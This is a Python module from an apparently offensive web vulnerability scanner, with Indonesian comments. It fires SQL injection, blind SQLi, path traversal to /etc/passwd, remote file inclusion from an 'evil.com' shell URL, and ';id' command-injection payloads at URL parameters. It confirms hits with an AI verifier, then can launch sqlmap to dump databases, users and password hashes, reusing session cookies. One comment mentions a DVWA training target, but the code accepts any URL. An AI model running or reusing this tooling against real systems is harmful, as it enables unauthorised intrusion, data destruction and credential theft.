#!/usr/bin/env python3
import random
import re
import time
import subprocess

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from config.var import var
from core.findings import findings
from core.ai_verifier import verify_finding


def _build_payload_url(url, payload):
    """
    FIX: payload harus dimasukkan ke query parameter, bukan di-append ke URL.
    Jika URL punya query (?a=1), ganti/tambah nilai param dengan payload.
    Jika tidak punya query, tambahkan ?test=<payload>.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    if qs:
        # Inject payload ke setiap parameter yang ada (pertama kali: param pertama saja)
        first_key = next(iter(qs))
        qs[first_key] = [payload]
    else:
        qs = {"test": [payload]}

    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))


def scan_vulnerabilities(url, types, proxy=None, verbose=False, session=None):
    """Scan URL for specified vulnerability types."""
    proxies = {"http": proxy, "https": proxy} if proxy else None
    log_file = var.log

    for vuln_type in types:
        print(f"[+] Scanning {url} for {vuln_type} vulnerabilities")
        with open(log_file, "a") as filelog:
            filelog.write(f"\n[+] Scanning {url} for {vuln_type} vulnerabilities\n")

        # FIX: headers per-request (rotasi UA), bukan sekali di luar
        if vuln_type in ["sqli", "blind"]:
            payloads = (
                ["'", "1' OR '1'='1", "1; DROP TABLE users --"]
                if vuln_type == "sqli"
                else ["1 AND 1=1", "1 AND 1=2"]
            )
        elif vuln_type in ["lfi", "rfi", "rce"]:
            payloads = {
                "lfi": ["/etc/passwd", "../../etc/passwd"],
                "rfi": ["http://evil.com/shell.txt"],
                "rce": [";id", "|id"],
            }[vuln_type]
        else:
            continue

        # Blind SQLi: bandingkan response true vs false


        if vuln_type == "blind":


            is_blind, blind_url = detect_blind_sqli(


                url, proxies=proxies,


                headers={"User-Agent": random.choice(var.ouruseragent)},


                session=session, verbose=verbose


            )


            if is_blind:


                print(f"[!] W00t !!! Found blind SQLi at: {blind_url}")


                with open(log_file, "a") as filelog:


                    filelog.write(f"\n[!] Found blind SQLi at: {blind_url}\n")


                exploit_level = getattr(var, "exploit_level", "detect")


                if exploit_level != "detect":


                    import os as _os


                    output_dir = _os.path.join(_os.path.dirname(var.log), "sqlmap_output")


                    run_sqlmap(url, exploit_level=exploit_level, output_dir=output_dir, session=session)


                continue



        for payload in payloads:
            # Rate limiting (--delay)
            delay = getattr(var, "delay", 0.0)
            if delay > 0:
                time.sleep(delay)

            test_url = _build_payload_url(url, payload)
            headers = {"User-Agent": random.choice(var.ouruseragent)}

            if verbose:
                print(f"[-] Testing: {test_url}")

            try:
                requester = session if session is not None else requests
                response = requester.get(
                    test_url, proxies=proxies, headers=headers,
                    timeout=10, verify=False
                )
                if detect_vulnerability(response.text, vuln_type):
                    ai_ok, ai_reason = verify_finding(
                        vuln_type, payload, response.text,
                        verbose=verbose
                    )
                    if not ai_ok:
                        if verbose:
                            print(f"[-] AI rejected false positive: {ai_reason}")
                        continue

                    print(f"[!] W00t !!! Found {vuln_type} vulnerability at: {test_url}")
                    with open(log_file, "a") as filelog:
                        filelog.write(
                            f"\n[!] Found {vuln_type} vulnerability at: {test_url}\n"
                        )

                    # Integrasi sqlmap (jika --exploit != detect)
                    exploit_level = getattr(var, "exploit_level", "detect")
                    if exploit_level != "detect" and vuln_type in ("sqli", "blind"):
                        import os as _os
                        output_dir = _os.path.join(_os.path.dirname(var.log), "sqlmap_output")
                        run_sqlmap(url, exploit_level=exploit_level, output_dir=output_dir, session=session)

                    # Stop payload berikutnya untuk URL ini
                    break
            except requests.RequestException as e:
                print(f"[!] Error scanning {test_url}: {e}")


def detect_vulnerability(html, vuln_type):
    """Detect vulnerabilities in HTML response."""
    patterns = {
        "sqli": [var.mysqli1, var.accesqli1, var.mssqli1, var.oracle],
        "blind": [var.mysqli1, var.accesqli1],
        "lfi": [r"root:.*:0:0:"],
        "rfi": [r"evil\.com"],
        "rce": [r"uid=\d+\(.+?\)"],
    }
    # FIX: jika pattern kosong / None, jangan crash
    for pattern in patterns.get(vuln_type, []):
        if not pattern:
            continue
        try:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        except re.error:
            # FIX: pattern dari config bisa bukan regex valid
            if pattern.lower() in html.lower():
                return True
    return False



def detect_blind_sqli(url, proxies=None, headers=None, session=None, verbose=False):
    """
    Deteksi blind SQLi dengan membandingkan response:
    - 1 AND 1=1 (true condition)
    - 1 AND 1=2 (false condition)
    Jika response berbeda signifikan → blind SQLi.
    """
    requester = session if session is not None else requests
    # DVWA rentan blind dengan payload ber-kutip (bukan 1 AND 1=1)
    true_payload = "1' AND '1'='1"
    false_payload = "1' AND '1'='2"

    true_url = _build_payload_url(url, true_payload)
    false_url = _build_payload_url(url, false_payload)

    try:
        r_true = requester.get(true_url, proxies=proxies, headers=headers, timeout=10, verify=False)
        r_false = requester.get(false_url, proxies=proxies, headers=headers, timeout=10, verify=False)

        len_diff = abs(len(r_true.text) - len(r_false.text))
        if verbose:
            print(f"[DEBUG] blind: true_len={len(r_true.text)}, false_len={len(r_false.text)}, diff={len_diff}")

        if len_diff > 30:
            return True, true_url
    except requests.RequestException as e:
        if verbose:
            print(f"[!] blind error: {e}")
    return False, None


def run_sqlmap(url, exploit_level="detect", output_dir=None, session=None):
    """
    Jalankan sqlmap pada URL yang terdeteksi SQLi (streaming output real-time).
    """
    import os
    import sys
    import subprocess

    # sqlmap dipanggil via python3 karena di sistem ini sqlmap adalah alias zsh
    sqlmap_script = os.path.expanduser("~/rapi/01-tools/sqlmap-dev/sqlmap.py")
    if os.path.exists(sqlmap_script):
        cmd = [sys.executable, sqlmap_script, "-u", url, "--batch", "--level=1", "--risk=1"]
    else:
        cmd = ["sqlmap", "-u", url, "--batch", "--level=1", "--risk=1"]

    if exploit_level == "dbs":
        cmd.append("--dbs")
    elif exploit_level == "tables":
        cmd.append("--tables")
    elif exploit_level == "columns":
        cmd.append("--columns")
    elif exploit_level == "dump":
        cmd.extend(["--dump", "--threads=4"])
    elif exploit_level == "users":
        cmd.append("--users")
    elif exploit_level == "passwords":
        cmd.append("--passwords")

    if output_dir:
        os.makedirs(output_dir, exist_ok=True)
        cmd.extend(["--output-dir", output_dir])

    # Tambahkan cookie dari session (untuk target ber-login seperti DVWA)
    if session is not None and hasattr(session, "cookies"):
        cookie_str = "; ".join([f"{k}={v}" for k, v in session.cookies.items()])
        if cookie_str:
            cmd.extend(["--cookie", cookie_str])
            print(f"[*] Cookie diteruskan ke sqlmap: {cookie_str[:60]}...")

    print(f"[*] Menjalankan sqlmap: {' '.join(cmd)}")

    # Streaming: gabungkan stdout + stderr, print per baris real-time
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,   # gabung stderr ke stdout
            text=True,
            bufsize=1,                  # line-buffered
        )
        output_lines = []
        for line in process.stdout:
            line = line.rstrip()
            if line:
                print(line)
                output_lines.append(line)
        process.wait()
        if process.returncode != 0:
            print(f"[!] sqlmap exit code: {process.returncode}")
        return "\n".join(output_lines)
    except FileNotFoundError:
        print("[!] sqlmap tidak terpasang")
        return None
    except KeyboardInterrupt:
        print("[!] sqlmap dihentikan oleh user")
        try:
            process.terminate()
        except Exception:
            pass
        return None


